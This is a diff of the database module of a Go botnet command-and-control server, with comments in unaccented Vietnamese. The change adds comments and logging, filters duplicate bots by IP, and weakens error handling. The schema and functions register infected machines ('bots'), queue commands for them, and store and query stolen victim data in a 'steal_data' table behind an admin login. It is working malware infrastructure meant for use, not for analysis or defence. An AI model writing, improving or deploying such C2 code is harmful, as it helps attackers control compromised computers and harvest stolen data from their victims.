@@ -1,36 +1,47 @@
+/**
+ * database.go
+ * Quan ly database SQLite cho C2 server
+ * Chuc nang: khoi tao, truy van, cap nhat bots, commands, steal_data, users
+ * Moi nhat: loc bot trung IP, chi giu 1 bot/IP online
+ */
+
 package main
 
 import (
     "database/sql"
     "log"
-
     
     _ "github.com/mattn/go-sqlite3"
 )
 
+/* Bien toan cuc database */
 var DB *sql.DB
 
-// Khoi tao database va tao cac bang neu chua ton tai
+/**
+ * Khoi tao database va tao cac bang neu chua ton tai
+ */
 func InitDatabase() {
     var err error
+    
+    /* Mo ket noi SQLite */
     DB, err = sql.Open("sqlite3", AppConfig.DBPath)
     if err != nil {
-        log.Fatal("Khong the mo database: ", err)
+        log.Fatal("[DB] Khong the mo database: ", err)
     }
     
-    // Bat che do WAL de hieu suat tot hon
+    /* Bat che do WAL de hieu suat tot hon */
     _, err = DB.Exec("PRAGMA journal_mode=WAL")
     if err != nil {
-        log.Fatal("Khong the bat WAL mode: ", err)
+        log.Fatal("[DB] Khong the bat WAL mode: ", err)
     }
     
-    // Bat foreign keys
+    /* Bat foreign keys */
     _, err = DB.Exec("PRAGMA foreign_keys=ON")
     if err != nil {
-        log.Fatal("Khong the bat foreign keys: ", err)
+        log.Fatal("[DB] Khong the bat foreign keys: ", err)
     }
     
-    // Tao bang bots
+    /* Tao bang bots */
     _, err = DB.Exec(`
         CREATE TABLE IF NOT EXISTS bots (
             id TEXT PRIMARY KEY,
@@ -51,10 +62,10 @@ func InitDatabase() {
         )
     `)
     if err != nil {
-        log.Fatal("Khong the tao bang bots: ", err)
+        log.Fatal("[DB] Khong the tao bang bots: ", err)
     }
     
-    // Tao bang commands
+    /* Tao bang commands */
     _, err = DB.Exec(`
         CREATE TABLE IF NOT EXISTS commands (
             id TEXT PRIMARY KEY,
@@ -70,10 +81,10 @@ func InitDatabase() {
         )
     `)
     if err != nil {
-        log.Fatal("Khong the tao bang commands: ", err)
+        log.Fatal("[DB] Khong the tao bang commands: ", err)
     }
     
-    // Tao bang steal_data
+    /* Tao bang steal_data */
     _, err = DB.Exec(`
         CREATE TABLE IF NOT EXISTS steal_data (
             id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -85,10 +96,10 @@ func InitDatabase() {
         )
     `)
     if err != nil {
-        log.Fatal("Khong the tao bang steal_data: ", err)
+        log.Fatal("[DB] Khong the tao bang steal_data: ", err)
     }
     
-    // Tao bang users
+    /* Tao bang users */
     _, err = DB.Exec(`
         CREATE TABLE IF NOT EXISTS users (
             username TEXT PRIMARY KEY,
@@ -97,10 +108,10 @@ func InitDatabase() {
         )
     `)
     if err != nil {
-        log.Fatal("Khong the tao bang users: ", err)
+        log.Fatal("[DB] Khong the tao bang users: ", err)
     }
     
-    // Tao admin mac dinh neu chua co
+    /* Tao admin mac dinh neu chua co */
     var count int
     err = DB.QueryRow("SELECT COUNT(*) FROM users WHERE username = 'admin'").Scan(&count)
     if err != nil || count == 0 {
@@ -113,9 +124,10 @@ func InitDatabase() {
         }
     }
     
-    // Tao index de tang toc truy van
+    /* Tao index de tang toc truy van */
     DB.Exec("CREATE INDEX IF NOT EXISTS idx_bots_status ON bots(status)")
     DB.Exec("CREATE INDEX IF NOT EXISTS idx_bots_last_seen ON bots(last_seen)")
+    DB.Exec("CREATE INDEX IF NOT EXISTS idx_bots_ip ON bots(ip)")
     DB.Exec("CREATE INDEX IF NOT EXISTS idx_commands_bot_id ON commands(bot_id)")
     DB.Exec("CREATE INDEX IF NOT EXISTS idx_commands_status ON commands(status)")
     DB.Exec("CREATE INDEX IF NOT EXISTS idx_steal_data_bot_id ON steal_data(bot_id)")
@@ -124,26 +136,59 @@ func InitDatabase() {
     log.Println("[DB] Da khoi tao database xong")
 }
 
-// Them bot moi vao database
+/**
+ * Them bot moi vao database
+ * Neu IP da co bot online, chi cap nhat thay vi tao moi (loc trung IP)
+ */
 func AddBot(bot *Bot) error {
-    _, err := DB.Exec(`
+    /* Kiem tra IP da co bot online chua */
+    var existingID string
+    err := DB.QueryRow("SELECT id FROM bots WHERE ip = ? AND status = 'online'", bot.IP).Scan(&existingID)
+    if err == nil && existingID != "" {
+        /* IP da co bot online, cap nhat thong tin thay vi tao moi */
+        _, updateErr := DB.Exec(`UPDATE bots SET 
+            hostname = ?, os = ?, last_seen = CURRENT_TIMESTAMP, 
+            status = 'online', cpu = ?, ram = ?, gpu = ?, 
+            disk = ?, local_ip = ?, arch = ?, is_admin = ? 
+            WHERE id = ?`,
+            bot.Hostname, bot.OS, bot.CPU, bot.RAM, bot.GPU, 
+            bot.Disk, bot.LocalIP, bot.Arch, bot.Admin, existingID)
+        if updateErr == nil {
+            bot.ID = existingID
+            log.Printf("[DB] Cap nhat bot trung IP: %s - %s", existingID, bot.IP)
+        }
+        return updateErr
+    }
+    
+    /* IP moi, tao bot moi */
+    _, err = DB.Exec(`
         INSERT OR REPLACE INTO bots 
         (id, hostname, os, ip, country, first_seen, last_seen, status, cpu, ram, gpu, disk, local_ip, arch, is_admin)
         VALUES (?, ?, ?, ?, ?, ?, ?, 'online', ?, ?, ?, ?, ?, ?, ?)
     `, bot.ID, bot.Hostname, bot.OS, bot.IP, bot.Country, bot.FirstSeen, bot.LastSeen,
        bot.CPU, bot.RAM, bot.GPU, bot.Disk, bot.LocalIP, bot.Arch, bot.Admin)
+    if err != nil {
+        log.Printf("[DB] Loi them bot: %s", err.Error())
+    }
     return err
 }
 
-// Cap nhat thong tin bot khi checkin
+/**
+ * Cap nhat thong tin bot khi checkin
+ */
 func UpdateBotCheckin(botID string, ip string) error {
     _, err := DB.Exec(`
         UPDATE bots SET last_seen = CURRENT_TIMESTAMP, ip = ?, status = 'online' WHERE id = ?
     `, ip, botID)
+    if err != nil {
+        log.Printf("[DB] Loi cap nhat checkin: %s", err.Error())
+    }
     return err
 }
 
-// Xoa bot da offline qua lau
+/**
+ * Danh dau bot da offline qua thoi gian timeout
+ */
 func CleanupOfflineBots() {
     result, err := DB.Exec(`
         UPDATE bots SET status = 'offline' 
@@ -159,7 +204,9 @@ func CleanupOfflineBots() {
     }
 }
 
-// Them lenh moi
+/**
+ * Them lenh moi vao database
+ */
 func AddCommand(cmd *Command) error {
     _, err := DB.Exec(`
         INSERT INTO commands (id, bot_id, module, action, params, status, created_at, updated_at)
@@ -168,7 +215,9 @@ func AddCommand(cmd *Command) error {
     return err
 }
 
-// Cap nhat ket qua thuc thi lenh
+/**
+ * Cap nhat ket qua thuc thi lenh
+ */
 func UpdateCommandResult(cmdID string, status string, result string) error {
     _, err := DB.Exec(`
         UPDATE commands SET status = ?, result = ?, updated_at = CURRENT_TIMESTAMP WHERE id = ?
@@ -176,7 +225,9 @@ func UpdateCommandResult(cmdID string, status string, result string) error {
     return err
 }
 
-// Xoa lenh cu het han
+/**
+ * Xoa lenh cu het han
+ */
 func CleanupOldCommands() {
     result, err := DB.Exec(`
         DELETE FROM commands 
@@ -192,7 +243,9 @@ func CleanupOldCommands() {
     }
 }
 
-// Luu du lieu steal
+/**
+ * Luu du lieu steal vao database
+ */
 func SaveStealData(botID string, dataType string, data string) error {
     _, err := DB.Exec(`
         INSERT INTO steal_data (bot_id, data_type, data) VALUES (?, ?, ?)
@@ -200,7 +253,9 @@ func SaveStealData(botID string, dataType string, data string) error {
     return err
 }
 
-// Lay danh sach bot (co filter)
+/**
+ * Lay danh sach bot co filter
+ */
 func GetBots(status string, country string, search string, limit int, offset int) ([]Bot, error) {
     query := "SELECT id, hostname, os, ip, country, first_seen, last_seen, status, cpu, ram, gpu, disk, local_ip, arch, is_admin FROM bots WHERE 1=1"
     args := []interface{}{}
@@ -254,7 +309,9 @@ func GetBots(status string, country string, search string, limit int, offset int
     return bots, nil
 }
 
-// Lay chi tiet 1 bot
+/**
+ * Lay chi tiet 1 bot theo ID
+ */
 func GetBotByID(botID string) (*Bot, error) {
     var bot Bot
     err := DB.QueryRow(`
@@ -269,7 +326,9 @@ func GetBotByID(botID string) (*Bot, error) {
     return &bot, nil
 }
 
-// Lay danh sach lenh
+/**
+ * Lay danh sach lenh co filter
+ */
 func GetCommands(botID string, status string, limit int) ([]Command, error) {
     query := "SELECT id, bot_id, module, action, params, status, result, created_at, updated_at FROM commands WHERE 1=1"
     args := []interface{}{}
@@ -312,7 +371,9 @@ func GetCommands(botID string, status string, limit int) ([]Command, error) {
     return commands, nil
 }
 
-// Lay du lieu steal
+/**
+ * Lay du lieu steal co filter
+ */
 func GetStealData(botID string, dataType string, limit int) ([]StealData, error) {
     query := "SELECT id, bot_id, data_type, data, timestamp FROM steal_data WHERE 1=1"
     args := []interface{}{}
@@ -345,6 +406,7 @@ func GetStealData(botID string, dataType string, limit int) ([]StealData, error)
         var s StealData
         err := rows.Scan(&s.ID, &s.BotID, &s.DataType, &s.Data, &s.Timestamp)
         if err != nil {
+            log.Println("[DB] Loi scan steal: ", err)
             continue
         }
         steals = append(steals, s)
@@ -353,44 +415,31 @@ func GetStealData(botID string, dataType string, limit int) ([]StealData, error)
     return steals, nil
 }
 
-// Lay thong ke tong quan
+/**
+ * Lay thong ke tong quan
+ */
 func GetStats() (map[string]interface{}, error) {
     stats := make(map[string]interface{})
     
     var totalBots, onlineBots, offlineBots int
-    err := DB.QueryRow("SELECT COUNT(*) FROM bots").Scan(&totalBots)
-    if err != nil {
-        return nil, err
-    }
+    var totalCommands, totalSteals int
+    
+    DB.QueryRow("SELECT COUNT(*) FROM bots").Scan(&totalBots)
     stats["total_bots"] = totalBots
     
-    err = DB.QueryRow("SELECT COUNT(*) FROM bots WHERE status = 'online'").Scan(&onlineBots)
-    if err != nil {
-        return nil, err
-    }
+    DB.QueryRow("SELECT COUNT(*) FROM bots WHERE status = 'online'").Scan(&onlineBots)
     stats["online_bots"] = onlineBots
     
-    err = DB.QueryRow("SELECT COUNT(*) FROM bots WHERE status = 'offline'").Scan(&offlineBots)
-    if err != nil {
-        return nil, err
-    }
+    DB.QueryRow("SELECT COUNT(*) FROM bots WHERE status = 'offline'").Scan(&offlineBots)
     stats["offline_bots"] = offlineBots
     
-    var totalCommands int
-    err = DB.QueryRow("SELECT COUNT(*) FROM commands").Scan(&totalCommands)
-    if err != nil {
-        return nil, err
-    }
+    DB.QueryRow("SELECT COUNT(*) FROM commands").Scan(&totalCommands)
     stats["total_commands"] = totalCommands
     
-    var totalSteals int
-    err = DB.QueryRow("SELECT COUNT(*) FROM steal_data").Scan(&totalSteals)
-    if err != nil {
-        return nil, err
-    }
+    DB.QueryRow("SELECT COUNT(*) FROM steal_data").Scan(&totalSteals)
     stats["total_steals"] = totalSteals
     
-    // Phan bo theo quoc gia
+    /* Phan bo theo quoc gia */
     countryRows, err := DB.Query("SELECT country, COUNT(*) as cnt FROM bots GROUP BY country ORDER BY cnt DESC LIMIT 10")
     if err == nil {
         countries := make(map[string]int)
@@ -398,13 +447,16 @@ func GetStats() (map[string]interface{}, error) {
             var country string
             var cnt int
             countryRows.Scan(&country, &cnt)
+            if country == "" {
+                country = "Unknown"
+            }
             countries[country] = cnt
         }
         countryRows.Close()
         stats["countries"] = countries
     }
     
-    // Phan bo theo OS
+    /* Phan bo theo OS */
     osRows, err := DB.Query("SELECT os, COUNT(*) as cnt FROM bots GROUP BY os")
     if err == nil {
         osStats := make(map[string]int)
@@ -412,6 +464,9 @@ func GetStats() (map[string]interface{}, error) {
             var os string
             var cnt int
             osRows.Scan(&os, &cnt)
+            if os == "" {
+                os = "Unknown"
+            }
             osStats[os] = cnt
         }
         osRows.Close()
@@ -421,13 +476,17 @@ func GetStats() (map[string]interface{}, error) {
     return stats, nil
 }
 
-// Cap nhat token cho user
+/**
+ * Cap nhat token cho user
+ */
 func UpdateUserToken(username string, token string) error {
     _, err := DB.Exec("UPDATE users SET token = ? WHERE username = ?", token, username)
     return err
 }
 
-// Lay user theo username
+/**
+ * Lay user theo username
+ */
 func GetUserByUsername(username string) (*User, error) {
     var user User
     err := DB.QueryRow("SELECT username, password_hash, token FROM users WHERE username = ?", username).Scan(
